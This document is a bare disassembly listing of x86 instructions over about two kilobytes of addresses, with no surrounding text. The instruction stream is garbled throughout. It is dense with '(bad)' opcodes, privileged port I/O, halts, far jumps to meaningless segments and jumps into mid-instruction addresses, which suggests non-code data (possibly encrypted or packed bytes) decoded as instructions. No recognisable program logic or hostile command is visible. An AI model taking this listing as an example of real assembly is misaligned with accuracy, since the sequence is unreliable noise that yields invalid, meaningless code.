  428eab:	repnz mul esp
  428eae:	out    dx,eax
  428eaf:	in     eax,0xf7
  428eb1:	jmp    0x428ea2
  428eb3:	call   0xfd44658d
  428eb8:	icebp  
  428eb9:	rcr    al,cl
  428ebb:	test   BYTE PTR [edx],0xd8
  428ebe:	pminsw mm1,QWORD PTR [edi]
  428ec1:	loopne 0x428ec2
  428ec3:	add    ah,ah
  428ec5:	rol    edi,1
  428ec7:	jmp    0xc8f1:0xc0c5d6e3
  428ece:	iret   
  428ecf:	in     al,0xf2
  428ed1:	mov    dh,0xf2
  428ed3:	mov    al,0xcc
  428ed5:	mov    ebp,0xdeedfaf6
  428eda:	(bad)  
  428edc:	fstp   st(7)
  428ede:	(bad)  
  428ee0:	jmp    0xcdca:0xb2ff04d4
  428ee7:	loope  0x428e9f
  428ee9:	in     al,dx
  428eea:	mov    al,0xcd
  428eec:	mov    ch,0xeb
  428eee:	push   ebp
  428ef0:	repz fcomip st,st(4)
  428ef3:	jmp    0xf9056ee9
  428ef8:	shl    dh,1
  428efa:	mov    BYTE PTR [eax],0x0
  428efd:	test   BYTE PTR [esi],0xd8
  428f00:	aad    0xcb
  428f02:	jmp    0x428edd
  428f04:	stos   DWORD PTR es:[edi],eax
  428f05:	(bad)  
  428f07:	shr    bh,1
  428f09:	cmc    
  428f0a:	loop   0x428edf
  428f0c:	mov    ch,0xb1
  428f0e:	repz mov ch,0xf3
  428f11:	jecxz  0x428f08
  428f13:	repnz sti 
  428f15:	repnz out dx,al
  428f17:	push   es
  428f18:	(bad)  
  428f1a:	mov    ebp,0xe6dad7e2
  428f1f:	or     edx,ebp
  428f21:	ret    0xd06
  428f24:	in     al,0xeb
  428f26:	loop   0x428f1f
  428f28:	(bad)  
  428f29:	mov    dh,0xfa
  428f2b:	cli    
  428f2c:	repnz mov dl,0xe5
  428f2f:	stc    
  428f30:	in     eax,dx
  428f31:	into   
  428f32:	cld    
  428f33:	cmc    
  428f34:	enter  0xdddc,0xf2
  428f38:	fcomi  st,st(5)
  428f3a:	(bad)  
  428f3b:	add    BYTE PTR [esi],al
  428f3d:	leave  
  428f3e:	jmp    0x428efc
  428f40:	cmc    
  428f41:	ret    0xef0f
  428f44:	in     al,0xb1
  428f46:	lock shl BYTE PTR [edi-0x4b331b1a],0xb7
  428f4e:	in     eax,dx
  428f4f:	mov    edx,0xbde8f7b5
  428f54:	mov    bh,0xb8
  428f56:	stc    
  428f57:	clc    
  428f58:	add    cl,bh
  428f5a:	fadd   QWORD PTR [ecx]
  428f5c:	jmp    0x428f23
  428f5e:	jmp    0x428f63
  428f60:	retf   
  428f61:	iret   
  428f62:	repz stc 
  428f64:	jmp    0xceb6:0xeeb2c2e6
  428f6b:	mov    bh,0xcb
  428f6d:	hlt    
  428f6e:	mov    ebx,0xe2bfc4b7
  428f73:	stc    
  428f74:	mov    ebp,0x2c003cc
  428f79:	int3   
  428f7a:	(bad)  
  428f7c:	retf   0xc0ca
  428f7f:	add    al,0xfe
  428f81:	in     al,0x3
  428f83:	(bad)  
  428f85:	in     eax,dx
  428f86:	loop   0x428f69
  428f88:	rol    cl,0xdb
  428f8b:	lods   al,BYTE PTR ds:[esi]
  428f8c:	repnz xlat BYTE PTR ds:[ebx]
  428f8e:	in     eax,dx
  428f8f:	hlt    
  428f90:	out    dx,al
  428f91:	sar    dh,1
  428f93:	jmp    0x5f8:0xe3bddd02
  428f9a:	shl    edi,cl
  428f9c:	cmc    
  428f9d:	out    0xe8,eax
  428f9f:	hlt    
  428fa0:	iret   
  428fa1:	or     al,0x13
  428fa3:	out    0xc0,eax
  428fa5:	mov    bl,0xae
  428fa7:	mov    dh,0xb7
  428fa9:	in     eax,dx
  428faa:	jmp    0x428f66
  428fac:	out    dx,eax
  428fad:	enter  0xd9cc,0xdb
  428fb1:	iret   
  428fb2:	cli    
  428fb3:	cli    
  428fb4:	(bad)  
  428fb5:	(bad)  
  428fb6:	mov    esp,0xc1e306c0
  428fbb:	icebp  
  428fbc:	idiv   ch
  428fbe:	jmp    0xa4354a1
  428fc3:	in     eax,dx
  428fc4:	(bad)  
  428fc5:	scas   al,BYTE PTR es:[edi]
  428fc6:	jmp    0xf01460a1
  428fcb:	repnz sti 
  428fcd:	mov    bh,0xb9
  428fcf:	aam    0xf1
  428fd1:	mov    esp,0xeff2f8ca
  428fd6:	(bad)  
  428fd7:	out    dx,al
  428fd8:	rol    DWORD PTR [eax],cl
  428fda:	sar    dl,cl
  428fdc:	loop   0x428fb4
  428fde:	rcr    ebx,0xdf
  428fe1:	sti    
  428fe2:	cli    
  428fe3:	fnstcw WORD PTR [edi-0x104e2309]
  428fe9:	jmp    0xdaba:0xf8eaeac6
  428ff0:	(bad)  
  428ff1:	enter  0xc9c9,0xef
  428ff5:	ret    
  428ff6:	int3   
  428ff7:	cli    
  428ff8:	aad    0xe0
  428ffa:	stc    
  428ffb:	sti    
  428ffc:	loopne 0x428ffd
  428ffe:	(bad)  
  429000:	(bad)  
  429001:	(bad)  
  429003:	adc    ebx,esp
  429005:	in     al,0xa8
  429007:	out    dx,al
  429008:	hlt    
  429009:	lods   al,BYTE PTR ds:[esi]
  42900a:	(bad)  
  42900c:	fdiv   DWORD PTR [edx+ebx*8-0x25021228]
  429013:	aad    0xf2
  429015:	mov    esi,0xded4ffc7
  42901a:	add    al,0xf0
  42901c:	call   0xfa0c6e27
  429021:	aam    0xdc
  429023:	pmulhw mm4,mm5
  429026:	out    dx,al
  429027:	test   al,0xc7
  429029:	mov    bl,0xb4
  42902b:	jmp    0xf9d9:0xacadf3f8
  429032:	add    ecx,esp
  429034:	std    
  429035:	sti    
  429036:	fcomip st,st(2)
  429038:	fld    st(0)
  42903a:	ror    ebx,1
  42903c:	fld    st(1)
  42903e:	in     al,0xd6
  429040:	dec    BYTE PTR [eax]
  429042:	jmp    0x429010
  429044:	jecxz  0x429007
  429046:	retf   
  429047:	int    0xaf
  429049:	mov    esi,0xb6c8f2ed
  42904f:	hlt    
  429050:	iret   
  429051:	into   
  429052:	loop   0x429012
  429054:	cli    
  429055:	mul    cl
  429057:	sar    ch,1
  429059:	push   es
  42905a:	add    al,0xf7
  42905c:	mov    dh,0xe0
  42905f:	cld    
  429060:	or     bh,ch
  429062:	in     al,0x9
  429064:	int3   
  429065:	out    dx,al
  429066:	loopne 0x429024
  429068:	loope  0x42901a
  42906a:	jecxz  0x429059
  42906c:	(bad)  
  42906d:	int    0xb7
  42906f:	jmp    0xfe154d42
  429074:	ror    ah,1
  429076:	rol    bl,cl
  429078:	ret    0xe2d0
  42907b:	cmc    
  42907c:	cld    
  42907d:	fmul   QWORD PTR [eax]
  42907f:	(bad)  
  429080:	fcmovu st,st(0)
  429082:	or     edi,esi
  429084:	mov    dl,0xae
  429086:	scas   eax,DWORD PTR es:[edi]
  429087:	cmc    
  429088:	mov    ch,0xe1
  42908a:	loopne 0x42905a
  42908c:	sar    bl,0xd2
  42908f:	mov    bh,0xf7
  429091:	fmul   st,st(7)
  429093:	fdiv   st(1),st
  429095:	out    dx,eax
  429096:	add    cl,dh
  429098:	mov    ebx,0xddd404d0
  42909d:	(bad)  
  42909e:	fnstsw WORD PTR [esp+ebp*8-0x57301505]
  4290a5:	test   eax,0xcfc8b6e3
  4290aa:	(bad)
  4290ae:	mov    eax,0xc8e4d2de
  4290b3:	(bad)  
  4290b5:	fnstsw ax
  4290b7:	out    0xd4,eax
  4290b9:	in     eax,0xfd
  4290bb:	fst    st(1)
  4290bd:	or     DWORD PTR ds:0xcd0d070e,eax
  4290c3:	in     al,0xb2
  4290c5:	mov    esi,0xf3adaccf
  4290ca:	out    dx,eax
  4290cb:	out    dx,eax
  4290cc:	in     al,0xe7
  4290ce:	enter  0xf9b8,0xda
  4290d2:	cli    
  4290d3:	(bad)  
  4290d5:	in     eax,dx
  4290d6:	in     eax,dx
  4290d7:	(bad)  
  4290d9:	add    al,0xda
  4290db:	cli    
  4290dc:	cmc    
  4290dd:	add    eax,0x30ceaf4
  4290e2:	iret   
  4290e3:	add    ah,ch
  4290e5:	retf   
  4290e6:	retf   0xb6d3
  4290e9:	sti    
  4290ea:	lock in eax,0xe9
  4290ed:	enter  0xf3f8,0xfe
  4290f1:	repz in al,dx
  4290f3:	div    eax
  4290f5:	iret   
  4290f6:	int3   
  4290f7:	test   edi,0xddc3dedd
  4290fd:	fcomip st,st(6)
  4290ff:	rcr    dl,0xef
  429102:	fild   DWORD PTR [edi]
  429104:	out    0xa8,eax
  429106:	out    dx,eax
  429107:	mov    dl,0xc6
  429109:	(bad)  
  42910a:	mov    bh,0xda
  42910c:	hlt    
  42910d:	in     eax,dx
  42910e:	mov    ch,0xcc
  429110:	in     eax,0xde
  429112:	int3   
  429113:	icebp  
  429114:	int    0xf9
  429116:	inc    DWORD PTR [edx]
  429118:	push   eax
  42911a:	mov    ecx,0x607c3d4
  42911f:	leave  
  429120:	sti    
  429121:	ret    0xf3f2
  429124:	mov    dl,0xbc
  429126:	mov    esp,0xc7f0d4dd
  42912b:	(bad)  
  42912c:	in     eax,0xe9
  42912e:	mov    ah,0xb5
  429130:	shl    ebp,1
  429132:	mov    ebp,0xb5f6f3ff
  429137:	fst    st(6)
  429139:	(bad)  
  42913a:	or     esi,edi
  42913c:	ror    ebx,0xe1
  42913f:	(bad)  
  429140:	retf   
  429141:	fsubrp st(6),st
  429143:	fsubrp st(7),st
  429145:	enter  0xd1f3,0xc4
  429149:	(bad)  
  42914a:	mov    ch,0xb4
  42914c:	sti    
  42914d:	mov    eax,0xf8f5dbcf
  429152:	sti    
  429153:	hlt    
  429154:	sar    DWORD PTR [ecx-0x2b2ffa3f],0xd8
  42915b:	jecxz  0x429144
  42915d:	xlat   BYTE PTR ds:[ebx]
  42915e:	pop    es
  42915f:	sti    
  429160:	push   es
  429161:	dec    BYTE PTR [eax]
  429163:	loop   0x429135
  429165:	iret   
  429166:	loopne 0x429124
  429168:	mul    bh
  42916a:	les    esi,FWORD PTR [edi-0x110f262c]
  429170:	sar    ecx,1
  429172:	cld    
  429173:	xlat   BYTE PTR ds:[ebx]
  429174:	xlat   BYTE PTR ds:[ebx]
  429175:	sar    BYTE PTR [ecx-0x28451a19],cl
  42917b:	or     eax,esp
  42917d:	jmp    0xf3467577
  429182:	cld    
  429183:	out    0xe3,al
  429185:	int3   
  429186:	loop   0x429170
  429188:	ror    bh,cl
  42918a:	into   
  42918b:	test   bh,0xba
  42918e:	retf   
  42918f:	(bad)  
  429191:	mov    esi,0xdc03f3cc
  429196:	fxch   st(6)
  429198:	fdivrp st(1),st
  42919a:	(bad)  
  42919c:	(bad)  
  42919d:	mov    dh,0xfa
  4291a0:	(bad)  
  4291a1:	jmp    0x4291a8
  4291a3:	icebp  
  4291a4:	stos   BYTE PTR es:[edi],al
  4291a5:	into   
  4291a6:	lods   eax,DWORD PTR ds:[esi]
  4291a7:	in     al,dx
  4291a8:	jmp    0xe929625a
  4291ad:	in     eax,0xb7
  4291af:	(bad)  
  4291b0:	int3   
  4291b1:	mov    ah,0xb8
  4291b3:	mov    ecx,0xf6d6d000
  4291b8:	loop   0x42917f
  4291ba:	or     esp,ebx
  4291bc:	jmp    0x4291c2
  4291be:	or     edi,ebp
  4291c0:	hlt    
  4291c1:	hlt    
  4291c2:	(bad)  
  4291c3:	repz leave 
  4291c5:	call   0xc1037ab7
  4291ca:	out    0xcb,al
  4291cc:	rcr    ebx,cl
  4291ce:	(bad)  
  4291d0:	mov    bh,0xfa
  4291d2:	repz cld 
  4291d4:	jmp    0x41851db
  4291d9:	ret    0xfcea
  4291dc:	cld    
  4291dd:	(bad)  
  4291df:	aad    0xdb
  4291e1:	push   es
  4291e2:	or     al,0xb
  4291e4:	mov    bl,0xa9
  4291e6:	shr    bl,cl
  4291e8:	mov    dh,0xeb
  4291ea:	jmp    0xdafa:0xbfcbdab0
  4291f1:	retf   
  4291f2:	aad    0xd8
  4291f4:	mov    esp,0xd5dc07e7
  4291f9:	neg    ecx
  4291fb:	std    
  4291fc:	lock jmp 0x429204
  4291ff:	add    bh,ch
  429201:	jmp    0xbdeb8102
  429206:	in     eax,dx
  429207:	loop   0x4291ec
  429209:	mov    dh,0xef
  42920b:	loopne 0x4291f2
  42920d:	aam    0xf7
  42920f:	mov    esi,0xf5b9ddcd
  429214:	cli    
  429215:	repz in eax,dx
  429217:	aam    0xff
  429219:	add    al,ah
  42921b:	aad    0xe4
  42921d:	std    
  42921e:	out    dx,eax
  42921f:	push   cs
  429220:	cmc    
  429221:	fucomip st,st(1)
  429223:	jmp    0x4291e5
  429225:	mov    al,0xa5
  429227:	(bad)  
  429228:	xlat   BYTE PTR ds:[ebx]
  429229:	mov    dh,0xce
  42922b:	aam    0xea
  42922d:	in     eax,dx
  42922e:	(bad)  
  42922f:	in     al,0xb8
  429231:	sti    
  429232:	sar    BYTE PTR [esi-0xf2d2928],1
  429238:	sar    esp,0x6
  42923b:	test   DWORD PTR [edx],0xcade0efe
  429241:	jmp    0xd6e0:0xbfc104fc
  429248:	jmp    0xdc258634
  42924d:	push   DWORD PTR [edi-0x45110509]
  429253:	ret    
  429254:	neg    bh
  429256:	fsubrp st(5),st
  429258:	fsubrp st(6),st
  42925a:	xlat   BYTE PTR ds:[ebx]
  42925b:	(bad)  
  42925d:	or     dl,ah
  42925f:	dec    DWORD PTR [ebx]
  429261:	loop   0x429227
  429263:	out    0xe4,al
  429265:	out    dx,eax
  429266:	(bad)  
  429267:	out    dx,al
  429268:	shl    BYTE PTR [edi-0x9243b0d],0xc4
  42926f:	(bad)  
  429270:	lock int3 
  429272:	sti    
  429273:	call   0x3035468
  429278:	hlt    
  429279:	mov    edx,0xff0c7b9
  42927e:	pop    es
  42927f:	push   cs
  429280:	(bad)  
  429281:	stc    
  429282:	or     eax,0xa9e6e80d
  429287:	repnz (bad) 
  429289:	(bad)  
  42928a:	repz xlat BYTE PTR ds:[ebx]
  42928c:	in     eax,0xc0
  42928e:	int    0xfb
  429290:	cld    
  429291:	mov    esi,0xdffdf8b5
  429296:	jecxz  0x42926f
  429298:	rcl    ebp,0xd9
  42929b:	(bad)  
  42929c:	cmc    
  42929d:	(bad)  
  42929e:	fsubrp st(0),st
  4292a0:	leave  
  4292a1:	or     DWORD PTR [edi],eax
  4292a3:	cli    
  4292a4:	repnz rcr ebp,0xd1
  4292a8:	jecxz  0x429278
  4292aa:	out    dx,eax
  4292ab:	ror    bl,1
  4292ad:	jmp    0x429260
  4292af:	rcl    bl,cl
  4292b1:	mov    ch,0xf1
  4292b3:	add    ebp,edx
  4292b5:	add    al,BYTE PTR [edx]
  4292b7:	mov    ebp,0xe002bcf8
  4292bc:	(bad)  
  4292be:	pop    es
  4292bf:	add    eax,0xcffad4ce
  4292c4:	stos   DWORD PTR es:[edi],eax
  4292c5:	out    dx,eax
  4292c6:	into   
  4292c7:	les    esi,FWORD PTR [ebp-0x48100553]
  4292cd:	icebp  
  4292ce:	ror    edx,cl
  4292d0:	retf   0xeaf4
  4292d3:	in     al,dx
  4292d4:	fcomp  st(0)
  4292d6:	(bad)  
  4292d8:	cli    
  4292d9:	jmp    0x4292b6
  4292db:	ret    
  4292dc:	add    al,0xeb
  4292de:	out    dx,al
  4292df:	fiadd  WORD PTR [ecx]
  4292e1:	leave  
  4292e2:	add    ch,dh
  4292e4:	ret    
  4292e5:	test   eax,0xaec5d1de
  4292ea:	jmp    0xdcb4:0xdfeed0cf
  4292f1:	repnz clc 
  4292f3:	repz sti 
  4292f5:	std    
  4292f6:	cli    
  4292f7:	loope  0x4292f6
  4292f9:	loop   0x4292d7
  4292fb:	(bad)  
  4292fc:	loopne 0x4292e3
  4292fe:	add    ecx,DWORD PTR ds:0xf2fec9e5
  429304:	test   eax,0xe1e3e4e3
  429309:	mov    esp,0xb6c5f7b4
  42930e:	mov    ebx,0xc9c9f2ba
  429313:	rol    BYTE PTR [ebx],cl
  429315:	out    dx,eax
  429316:	test   ebp,0xaf6fa04
  42931c:	neg    ebp
  42931e:	(bad)  
  429320:	faddp  st(6),st
  429322:	fmul   DWORD PTR [ebx]
  429324:	(bad)  
  429326:	mov    bh,0xe4
  429328:	ret    
  429329:	leave  
  42932a:	xlat   BYTE PTR ds:[ebx]
  42932b:	aad    0xcf
  42932d:	iret   
  42932e:	lds    esi,FWORD PTR [edi-0x3c31211c]
  429334:	hlt    
  429335:	int    0xdb
  429337:	(bad)  
  429338:	(bad)  
  42933a:	in     al,0xea
  42933c:	hlt    
  42933d:	sar    ebp,0xc9
  429340:	into   
  429341:	sti    
  429342:	add    ecx,DWORD PTR [ebx]
  429344:	(bad)  
  429345:	(bad)  
  429347:	faddp  st(3),st
  429349:	ret    0xf2c2
  42934c:	aad    0xf3
  42934e:	(bad)  
  429351:	sar    DWORD PTR [ebp-0x2431725],cl
  429357:	mul    edx
  429359:	std    
  42935a:	fsubrp st(2),st
  42935c:	(bad)  
  42935d:	out    dx,eax
  42935e:	fmulp  st(7),st
  429360:	mov    BYTE PTR [edi],0xf
  429363:	shl    BYTE PTR [edx-0x2b5b3c1d],0xb4
  42936a:	mov    dh,0xca
  42936c:	loope  0x429349
  42936e:	sti    
  42936f:	fmul   st,st(2)
  429371:	mov    ebx,0xec03ffb4
  429376:	pop    es
  429377:	std    
  429378:	(bad)  
  42937a:	icebp  
  42937b:	mov    eax,0xfad406ff
  429380:	cli    
  429381:	retf   
  429382:	iret   
  429383:	(bad)  
  429384:	out    dx,eax
  429385:	jmp    0xe6175448
  42938a:	icebp  
  42938b:	in     eax,0xfa
  42938d:	aad    0xec
  42938f:	jmp    0xe1dc:0xdad0d2db
  429396:	int    0xf4
  429398:	hlt    
  429399:	loope  0x429397
  42939b:	repnz cli 
  42939d:	or     ebx,esp
  42939f:	(bad)  
  4293a0:	jecxz  0x429364
  4293a2:	add    eax,0xe8cdf0c4
  4293a7:	mov    esp,0xcce3edd1
  4293ac:	rcl    bh,cl
  4293ae:	mov    ch,0xc9
  4293b0:	retf   
  4293b1:	add    edx,edx
  4293b3:	mov    edi,0xc1b8edd5
  4293b8:	cld    
  4293b9:	inc    BYTE PTR [ebx]
  4293bb:	fiadd  DWORD PTR [esi]
  4293bd:	(bad)  
  4293be:	loop   0x4293a6
  4293c0:	add    ch,cl
  4293c2:	or     ebp,eax
  4293c4:	test   eax,0xebd2b0aa
  4293c9:	fdivr  st(3),st
  4293cb:	(bad)  
  4293cc:	(bad)  
  4293cd:	mov    cl,0xcd
  4293cf:	mov    ebx,0xcdcbd8ea
  4293d4:	loopne 0x4293d2
  4293d6:	cli    
  4293d7:	add    edi,DWORD PTR [esi-0x190e14fa]
  4293dd:	fucom  st(7)
  4293df:	or     esi,ebp
  4293e1:	int    0xea
  4293e3:	enter  0xd0ab,0xf1
  4293e7:	xlat   BYTE PTR ds:[ebx]
  4293e8:	(bad)  
  4293e9:	lods   eax,DWORD PTR ds:[esi]
  4293ea:	repz (bad) 
  4293ec:	repnz lock sti 
  4293ef:	mov    eax,0xdfeadfbd
  4293f4:	call   0xfa498fd5
  4293f9:	test   BYTE PTR [eax],0xc4
  4293fc:	clc    
  4293fd:	imul   dh
  4293ff:	or     BYTE PTR [ecx*1-0xe53fe36],cl
  429406:	ret    0xf7ee
  429409:	in     al,0xee
  42940b:	(bad)  
  42940c:	loope  0x4293c5
  42940e:	in     al,dx
  42940f:	mov    bh,0xf4
  429411:	frndint 
  429413:	loop   0x42940f
  429415:	fcom   st(1)
  429417:	(bad)  
  429418:	cli    
  429419:	fimul  DWORD PTR [ebx]
  42941b:	jecxz  0x429416
  42941d:	add    dh,ah
  42941f:	(bad)  
  429420:	loope  0x429411
  429422:	loopne 0x4293f1
  429424:	int    0xc9
  429426:	repnz mov ebp,0xc4fbedc6
  42942c:	cli    
  42942d:	mov    cl,0xbf
  42942f:	hlt    
  429430:	mov    ch,0xbe
  429432:	sar    DWORD PTR [esi+0xbde8b7],cl
  429438:	idiv   dh
  42943a:	(bad)  
  42943b:	add    eax,0xdbddcbdf
  429440:	(bad)  
  429441:	call   0xc211842e
  429446:	sar    BYTE PTR [esi-0x2f0a4e2a],1
  42944c:	enter  0xccae,0xbe
  429450:	int    0xbc
  429452:	jmp    0xdabd:0xf6ecb8c8
  429459:	(bad)  
  42945a:	rol    BYTE PTR [eax],cl
  42945c:	inc    BYTE PTR [edi]
  42945e:	loope  0x429444
  429460:	cmc    
  429461:	int    0xdc
  429463:	fxch   st(3)
  429465:	in     eax,0xf3
  429467:	out    0xc1,al
  429469:	int3   
  42946a:	ret    0xd3ee
  42946d:	out    dx,eax
  42946e:	repnz (bad) 
  429470:	fsubp  st(3),st
  429472:	iret   
  429473:	mov    edi,0xf0bfd2e0
  429478:	cld    
  429479:	stc    
  42947a:	repz mov esp,0xebfbe9e7
  429480:	out    0xde,eax
  429482:	(bad)
  429485:	ret    
  429486:	(bad)  
  429488:	out    0xf1,al
  42948a:	mov    cl,0xc8
  42948c:	mov    dh,0xd8
  42948e:	xlat   BYTE PTR ds:[ebx]
  42948f:	mov    bh,0xed
  429491:	in     al,0xf9
  429493:	int    0xbe
  429495:	ret    0xfae0
  429498:	(bad)  
  429499:	icebp  
  42949a:	stc    
  42949b:	fld    st(2)
  42949d:	retf   0xebdd
  4294a0:	add    ebp,esp
  4294a2:	add    DWORD PTR [edx],eax
  4294a4:	scas   al,BYTE PTR es:[edi]
  4294a5:	shr    DWORD PTR [edi-0x3d1f392d],0xe6
  4294ac:	mov    dh,0xb6
  4294ae:	mov    eax,0xf1d5cfdb
  4294b3:	into   
  4294b4:	icebp  
  4294b5:	clc    
  4294b6:	(bad)  
  4294b8:	int3   
  4294b9:	cmc    
  4294ba:	or     eax,DWORD PTR [ebx]
  4294bc:	or     esi,ebp
  4294be:	iret   
  4294bf:	enter  0xea0e,0x3
  4294c3:	std    
  4294c4:	repnz test al,0xe2
  4294c7:	ret    0xe4b3
  4294ca:	imul   DWORD PTR [eax-0x4848144f]
  4294d0:	repz jmp 0x4294bf
  4294d3:	stc    
  4294d4:	into   
  4294d5:	pop    es
  4294d6:	aam    0xe2
  4294d8:	rol    ebp,1
  4294da:	(bad)  
  4294db:	in     eax,0xe1
  4294dd:	call   0x53b699f
  4294e2:	add    ebx,esi
  4294e4:	retf   
  4294e5:	loop   0x4294d4
  4294e7:	out    dx,eax
  4294e8:	(bad)  
  4294e9:	int3   
  4294ea:	in     eax,0xf0
  4294ec:	cli    
  4294ed:	sti    
  4294ee:	out    0xdb,al
  4294f0:	(bad)
  4294f3:	(bad)  
  4294f4:	lock xlat BYTE PTR ds:[ebx]
  4294f6:	loopne 0x4294e5
  4294f8:	loop   0x4294fc
  4294fa:	rcr    dh,cl
  4294fc:	add    bh,al
  4294fe:	std    
  4294ff:	inc    bh
  429501:	or     al,0x13
  429503:	dec    ecx
  429505:	loopne 0x4294dd
  429507:	retf   0xcbc9
  42950a:	in     al,0xc8
  42950c:	mov    dl,0xb0
  42950e:	(bad)  
  429510:	retf   
  429511:	mov    ah,0xed
  429513:	sti    
  429514:	(bad)  
  429515:	fdiv   DWORD PTR [ebp-0x3c0a010d]
  42951b:	or     ebx,eax
  42951d:	or     edi,esi
  42951f:	or     DWORD PTR ds:0xb212f813,eax
  429525:	out    0xcb,al
  429527:	(bad)  
  429528:	aad    0xb6
  42952a:	(bad)  
  42952b:	lods   al,BYTE PTR ds:[esi]
  42952c:	mov    bl,0xce
  42952e:	call   0xb2385508
  429533:	mov    ah,0xee
  429535:	int    0xf1
  429537:	hlt    
  429538:	idiv   DWORD PTR [esi+0xaeb0bc4]
  42953e:	fdivp  st(3),st
  429540:	add    DWORD PTR [esi],ecx
  429542:	out    0xe7,eax
  429544:	retf   
  429545:	out    dx,al
  429546:	shl    bl,0xee
  429549:	(bad)  
  42954a:	icebp  
  42954b:	shl    DWORD PTR [edx+edx*8-0x17263707],0xfc
  429553:	cmc    
  429554:	mov    ebp,0xe3ecd9f7
  429559:	mov    ebp,0xc5c4dbf5
  42955e:	cld    
  42955f:	stc    
  429560:	pop    es
  429561:	or     BYTE PTR [edx],al
  429563:	adc    cl,al
  429565:	(bad)  
  429566:	mov    esp,0xc7dbd3be
  42956b:	mov    edx,0xbeefcbd4
  429570:	(bad)  
  429572:	aad    0xd8
  429574:	fsubr  st,st(5)
  429576:	int3   
  429577:	int3   
  429578:	fadd   QWORD PTR [edi]
  42957a:	hlt    
  42957b:	or     eax,ebx
  42957d:	pop    es
  42957e:	mov    ebp,0xc5fae8ed
  429583:	loopne 0x42956e
  429585:	fsub   st,st(7)
  429587:	scas   al,BYTE PTR es:[edi]
  429588:	aad    0xc3
  42958a:	in     eax,0xb3
  42958c:	ror    edx,0xc4
  42958f:	jmp    0xbcde:0xefcbfed9
  429596:	aad    0xd9
  429598:	mov    esp,0xe8d1c0f8
  42959d:	cli    
  42959e:	add    bh,ch
  4295a0:	in     eax,0xcb
  4295a2:	add    esp,esp
  4295a4:	int3   
  4295a5:	mov    cl,0xb7
  4295a7:	in     eax,dx
  4295a8:	aam    0xc6
  4295aa:	ror    esp,cl
  4295ac:	int3   
  4295ad:	(bad)  
  4295ae:	mov    bh,0xe5
  4295b0:	jmp    0x42958e
  4295b2:	clc    
  4295b3:	hlt    
  4295b4:	fadd   DWORD PTR [ecx]
  4295b6:	out    0xe2,eax
  4295b8:	idiv   BYTE PTR [esi-0x244029fd]
  4295be:	or     ch,bh
  4295c0:	(bad)  
  4295c1:	retf   
  4295c2:	jecxz  0x4295cf
  4295c4:	jmp    0x4295ab
  4295c6:	mov    bl,0xa4
  4295c8:	in     eax,dx
  4295c9:	aam    0xf7
  4295cb:	cli    
  4295cc:	retf   0xf7ef
  4295cf:	repz mov ecx,0xdffdfcd5
  4295d5:	aad    0xce
  4295d7:	clc    
  4295d8:	(bad)  
  4295d9:	xlat   BYTE PTR ds:[ebx]
  4295da:	(bad)  
  4295db:	ffreep st(2)
  4295dd:	add    al,0x3
  4295df:	(bad)  
  4295e0:	sti    
  4295e1:	fld    QWORD PTR [esi]
  4295e3:	fucomp st(4)
  4295e5:	mov    esi,0xebcee4bd
  4295ea:	mov    dl,0xeb
  4295ec:	out    0xcb,al
  4295ee:	jmp    0x4295a7
  4295f0:	mov    ebp,0xff02d7f8
  4295f5:	rcl    dl,1
  4295f7:	stc    
  4295f8:	cld    
  4295f9:	ret    
  4295fa:	rol    DWORD PTR [eax],cl
  4295fc:	out    0x2,eax
  4295fe:	call   0xe52660f1
  429603:	(bad)  
  429605:	rol    dl,1
  429607:	scas   eax,DWORD PTR es:[edi]
  429608:	(bad)  
  429609:	call   0xf73246be
  42960e:	imul   al
  429610:	mov    eax,0xc3e8d3f4
  429615:	hlt    
  429616:	fucom  st(6)
  429618:	mov    ebp,0xfbd4e6fb
  42961d:	lock hlt 
  42961f:	stc    
  429620:	in     al,dx
  429621:	retf   0xd2fc
  429624:	mov    bl,0xe0
  429626:	mov    dl,0xe6
  429628:	div    DWORD PTR [ebx-0x2d3b0e39]
  42962e:	(bad)  
  42962f:	(bad)  
  429631:	clc    
  429632:	mov    ecx,0x3c1d1f6
  429637:	add    ebx,ebx
  429639:	mov    ebp,0xe0050bea
  42963e:	out    dx,eax
  42963f:	dec    BYTE PTR [edi]
  429641:	jmp    0xca2e8454
  429646:	ret    
  429647:	retf   0xaef5
  42964a:	out    0xc7,eax
  42964c:	fdiv   st,st(1)
  42964e:	(bad)  
  42964f:	sti    
  429650:	retf   
  429651:	int3   
  429652:	jmp    0x429631
  429654:	mov    esi,0xdebedddd
  429659:	in     eax,0xd7
  42965b:	rcr    ecx,1
  42965d:	ffreep st(5)
  42965f:	les    ecx,FWORD PTR [edx]
  429661:	out    dx,eax
  429662:	push   cs
  429663:	fsubr  st(5),st
  429665:	enter  0xd6cc,0xad
  429669:	scas   al,BYTE PTR es:[edi]
  42966a:	hlt    
  42966b:	out    0xeb,eax
  42966d:	in     eax,dx
  42966e:	clc    
  42966f:	out    0xe4,al
  429671:	retf   
  429672:	lock repz repz in eax,dx
  429676:	std    
  429677:	xlat   BYTE PTR ds:[ebx]
  429678:	aad    0x4
  42967a:	mov    esp,0xf9dfdaff
  42967f:	pop    es
  429680:	(bad)  
  429682:	or     eax,0xf3cda808
  429687:	int3   
  429688:	mov    cl,0xe6
  42968a:	aam    0xc7
  42968c:	into   
  42968d:	imul   eax
  42968f:	(bad)  
  429690:	cmc    
  429691:	(bad)  
  429692:	fiadd  DWORD PTR [ecx]
  429694:	shr    eax,0xd0
  429697:	jecxz  0x42965c
  429699:	in     al,0xbc
  42969b:	sar    bl,cl
  42969d:	call   0xa0a5f8d
  4296a2:	std    
  4296a3:	in     al,dx
  4296a4:	loope  0x429692
  4296a6:	into   
  4296a7:	repnz int3 
  4296a9:	jmp    0xf4bf:0xd5e7fae2
  4296b0:	fstp   TBYTE PTR [ecx-0x331e0530]
  4296b6:	mov    eax,0xe106c2d7
  4296bb:	jmp    0xf4c9:0xe108e1f0
  4296c2:	iret   
  4296c3:	loope  0x4296a8
  4296c5:	mov    edi,0xd2b1d0dc
  4296ca:	xlat   BYTE PTR ds:[ebx]
  4296cb:	loope  0x4296a3
  4296cd:	jmp    0xe41574cc
  4296d2:	mov    esp,0xc3e8c8f8
  4296d7:	aad    0xcc
  4296d9:	fcmovbe st,st(5)
  4296db:	mov    eax,0xf9e4040b
  4296e0:	retf   0xd06
  4296e3:	in     eax,dx
  4296e4:	ret    
  4296e5:	leave  
  4296e6:	rcl    esi,1
  4296e8:	lds    ebp,FWORD PTR [ebp-0x17361519]
  4296ee:	mov    cl,0xf2
  4296f0:	repnz out dx,al
  4296f2:	fcmovnbe st,st(2)
  4296f4:	cmc    
  4296f5:	in     eax,dx
  4296f6:	repnz stc 
  4296f8:	cli    
